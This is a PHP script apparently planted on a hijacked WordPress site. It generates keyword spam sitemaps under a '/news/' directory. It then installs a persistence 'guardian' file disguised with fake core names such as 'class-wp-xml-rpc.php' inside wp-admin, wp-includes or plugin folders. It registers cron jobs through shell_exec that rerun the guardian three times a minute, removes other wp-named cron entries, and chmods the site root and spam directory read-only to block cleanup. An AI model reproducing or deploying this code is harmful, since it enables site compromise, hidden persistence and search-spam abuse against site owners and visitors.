<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
@ini_set('memory_limit', '512M');
@set_time_limit(0);

echo "<pre>--- System Start ---\n";

$abs_path  = dirname(__FILE__); 
$root_path = dirname($abs_path); 

echo "Path Detect: $abs_path\n";

function get_deep_hidden_path($root) {
    $scan_dirs = [$root . '/wp-admin', $root . '/wp-includes', $root . '/wp-content/plugins'];
    $potential_targets = [];
    foreach ($scan_dirs as $sd) {
        if (!is_dir($sd)) continue;
        try {
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sd, 16), 1);
            foreach ($it as $file) { if ($file->isDir()) { $potential_targets[] = $file->getRealPath(); } }
        } catch (Exception $e) {}
    }
    return (!empty($potential_targets)) ? $potential_targets[array_rand($potential_targets)] : $root;
}

$guardian_parent = get_deep_hidden_path($root_path);
$fake_names = ['class-wp-xml-rpc.php', 'wp-db-inc.php', 'load-scripts-extra.php', 'class-wp-query-data.php'];
$guardian_file = $guardian_parent . "/" . $fake_names[array_rand($fake_names)];

function global_chmod($path, $mode) {
    if (!is_dir($path)) return;
    @chmod($path, $mode);
    try {
        $items = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, 16), 1);
        foreach ($items as $item) { @chmod($item->getPathname(), $mode); }
    } catch (Exception $e) {}
}

echo "Unlocking Root & news...\n";
if(!@chmod($root_path, 0755)) echo "Warning: Gagal unlock root_path.\n";
global_chmod($abs_path, 0755);

$protocol = "https"; 
$domain_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . '/news/';
$base_url   = $domain_url . "?video=";
$local_file = $abs_path . "/kw.txt";

$sitemap_files = [];

if (file_exists($local_file)) {
    echo "Generating Sitemap...\n";
    $handle = fopen($local_file, "r");
    $sitemap_num = 1; $count = 0;
    $index_xml = '<?xml version="1.0" encoding="UTF-8"?><sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
    $current_xml = '<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
    
    while (($line = fgets($handle)) !== false) {
        $kw = trim($line); if (empty($kw)) continue;
        $url = htmlspecialchars($base_url . str_replace(' ', '+', $kw), ENT_XML1, 'UTF-8');
        $current_xml .= "<url><loc>{$url}</loc></url>";
        $count++;
        if ($count >= 10000) {
            $fn = "sitemap-{$sitemap_num}.xml";
            file_put_contents($abs_path."/".$fn, $current_xml.'</urlset>');
            $index_xml .= "<sitemap><loc>{$domain_url}{$fn}</loc></sitemap>";
            $sitemap_files[] = $fn;
            $sitemap_num++; $count = 0;
            $current_xml = '<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
        }
    }
    fclose($handle);
    if ($count > 0) {
        $fn = "sitemap-{$sitemap_num}.xml";
        file_put_contents($abs_path."/".$fn, $current_xml.'</urlset>');
        $index_xml .= "<sitemap><loc>{$domain_url}{$fn}</loc></sitemap>";
        $sitemap_files[] = $fn;
    }
    $final_index = $index_xml.'</sitemapindex>';
    file_put_contents($abs_path."/sitemap-index.xml", $final_index);
    $sitemap_files[] = "sitemap-index.xml";
    echo "Sitemap Updated.\n";
} else {
    echo "Error: kw.txt tidak ditemukan!\n";
}

echo "Deploying Guardian to: $guardian_file\n";
$guardian_code = '<?php
$r = "'.$root_path.'";
$t = "'.$abs_path.'";
function immortal_lock($root, $news){
    @chmod($root, 0755); 
    if(!is_dir($news)){ @mkdir($news, 0755, true); }
    try {
        @chmod($news, 0755);
        $i = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($news, 16), 1);
        foreach($i as $f){ @chmod($f->getPathname(), 0555); }
        @chmod($news, 0555);
    } catch (Exception $e){}
    @chmod($root, 0555); 
}
immortal_lock($r, $t);
?>';

if(file_put_contents($guardian_file, $guardian_code)) {
    @chmod($guardian_file, 0444);
    echo "Guardian Deployed.\n";
} else {
    echo "Gagal menulis file Guardian.\n";
}

if (function_exists('shell_exec')) {
    echo "Registering Cron Jobs...\n";
    $php_bin = "/usr/bin/php";
    $cron_jobs = "* * * * * $php_bin $guardian_file > /dev/null 2>&1" . PHP_EOL;
    $cron_jobs .= "* * * * * sleep 20; $php_bin $guardian_file > /dev/null 2>&1" . PHP_EOL;
    $cron_jobs .= "* * * * * sleep 40; $php_bin $guardian_file > /dev/null 2>&1";

    $existing_cron = (string)shell_exec('crontab -l 2>/dev/null');
    $clean_cron = preg_replace('/.*class-wp-.*\.php.*/', '', $existing_cron);
    $clean_cron = preg_replace('/.*wp-.*\.php.*/', '', $clean_cron);

    file_put_contents('/tmp/cron_f', trim($clean_cron) . PHP_EOL . $cron_jobs . PHP_EOL);
    exec('crontab /tmp/cron_f');
    @unlink('/tmp/cron_f');
    echo "Cron Jobs Updated.\n";
} else {
    echo "shell_exec dimatikan. Pasang Cron manual untuk: $guardian_file\n";
}

global_chmod($abs_path, 0555);
@chmod($root_path, 0555);

echo "Root & news Locked to 555.\n";
echo "--- Output Sitemap List ---\n";
if (!empty($sitemap_files)) {
    sort($sitemap_files);
    foreach ($sitemap_files as $file) {
        echo $file . "\n";
    }
}
echo "--- System End ---</pre>";
?>
